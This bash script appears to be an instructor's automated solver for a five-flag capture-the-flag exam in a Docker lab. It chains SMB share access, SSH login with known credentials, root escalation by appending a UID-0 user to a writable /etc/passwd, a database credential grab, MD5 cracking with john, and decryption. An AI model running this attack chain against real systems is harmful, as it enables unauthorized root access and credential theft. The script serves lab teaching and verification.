#!/bin/bash
# Final 2026 — automated solver / verifier.
# Run INSIDE final2026-attacker (as root):
#     docker exec -i final2026-attacker bash -s < solve.sh
# Walks the intended path for all five flags and reports pass/fail.
# Instructor sanity-check only; not given to students.

set -u
WEB=10.10.12.10; SMB=10.10.12.11; SSH=10.10.12.12; DB=10.10.12.13
DBUSER=webuser; DBPASS='Fr3ight_db!2026'
SSHUSER=dchen; SSHPW='Winter2026'
SSHOPT="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PreferredAuthentications=password -o ConnectTimeout=8"
PASS=0; FAIL=0
check(){ if printf '%s' "$2" | grep -q "$1"; then echo "  [PASS] $1"; PASS=$((PASS+1)); else echo "  [FAIL] missing $1"; FAIL=$((FAIL+1)); fi; }

# Helpers only the verifier needs (students use interactive ssh/su).
for p in sshpass expect; do
  command -v "$p" >/dev/null 2>&1 || { echo "[*] installing $p..."; apt-get update -qq >/dev/null 2>&1; apt-get install -y -q "$p" >/dev/null 2>&1; }
done

echo "== F1: web recon =="
check 'flag{final2026_web_recon}' "$(curl -s http://$WEB/)"

echo "== F2: anonymous SMB share =="
rm -f /tmp/pol.txt
smbclient "//$SMB/hr" -N -c 'get IT_onboarding_policy.txt /tmp/pol.txt' >/dev/null 2>&1
check 'flag{final2026_smb_share}' "$(cat /tmp/pol.txt 2>/dev/null)"

echo "== F3: targeted SSH brute force (dchen:Winter2026) =="
F3=$(sshpass -p "$SSHPW" ssh -n $SSHOPT "$SSHUSER@$SSH" 'cat ~/user.txt' 2>/dev/null)
check 'flag{final2026_ssh_foothold}' "$F3"

echo "== F4: world-writable /etc/passwd -> su to UID 0 =="
# dchen appends a UID-0 account (PermitRootLogin blocks a *remote* root login,
# so escalation is local via su — exactly the student path).
HASH=$(openssl passwd -1 -salt xx pwned)
sshpass -p "$SSHPW" ssh -n $SSHOPT "$SSHUSER@$SSH" \
  "grep -q '^r00t:' /etc/passwd || echo 'r00t:$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd" 2>/dev/null
F4=$(expect -c "
set timeout 25
spawn ssh $SSHOPT $SSHUSER@$SSH
expect \"assword:\"
send \"$SSHPW\r\"
expect \"\\\$ \"
send \"su r00t -c \\\"id; cat /root/root.txt\\\"\r\"
expect \"assword:\"
send \"pwned\r\"
expect eof
" 2>/dev/null)
echo "  $(printf '%s' "$F4" | grep -o 'uid=0[^ ]*' | head -1)"
check 'flag{final2026_root_privesc}' "$F4"

echo "== F5: cred reuse -> crack MD5 -> openssl decrypt =="
CREDS=$(sshpass -p "$SSHPW" ssh -n $SSHOPT "$SSHUSER@$SSH" 'cat /opt/scripts/db_backup.sh' 2>/dev/null)
printf '%s' "$CREDS" | grep -q "$DBUSER" && echo "  [ok] DB creds found in db_backup.sh"
# Kali's MariaDB client defaults to requiring TLS; this server has none -> --ssl=0
HASHVAL=$(mysql --ssl=0 -h "$DB" -u "$DBUSER" -p"$DBPASS" company_db -N -B -e 'SELECT secret_hash FROM vault LIMIT 1;' 2>/dev/null)
echo "  db hash: ${HASHVAL:-<none>}"
echo "$HASHVAL" > /tmp/h.txt
rm -f /tmp/final.pot
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --pot=/tmp/final.pot /tmp/h.txt >/dev/null 2>&1
KEY=$(john --show --format=raw-md5 --pot=/tmp/final.pot /tmp/h.txt 2>/dev/null | head -1 | cut -d: -f2)
echo "  cracked key: ${KEY:-<none>}"
sshpass -p "$SSHPW" ssh -n $SSHOPT "$SSHUSER@$SSH" 'cat /opt/vault/q4_export.enc' > /tmp/vault.enc 2>/dev/null
F5=$(openssl enc -aes-256-cbc -d -salt -in /tmp/vault.enc -k "$KEY" 2>/dev/null)
check 'flag{final2026_crack_decrypt}' "$F5"

echo
echo "RESULT: $PASS passed, $FAIL failed"
if [ "$FAIL" -eq 0 ]; then echo "ALL FIVE FLAGS REACHABLE"; exit 0; else echo "SOME FLAGS UNREACHABLE — ensure the stack is fully up (~60s after 'up -d')"; exit 1; fi
